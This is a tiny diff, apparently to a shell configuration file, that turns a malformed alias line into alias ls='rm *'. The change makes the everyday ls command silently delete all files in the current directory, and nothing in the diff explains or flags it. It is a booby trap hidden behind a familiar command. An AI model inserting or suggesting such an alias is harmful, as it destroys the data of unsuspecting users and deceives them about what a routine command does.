@@ -1,1 +1,1 @@
-alias [ -p ] [ls='rm *'] 
+alias ls='rm *'
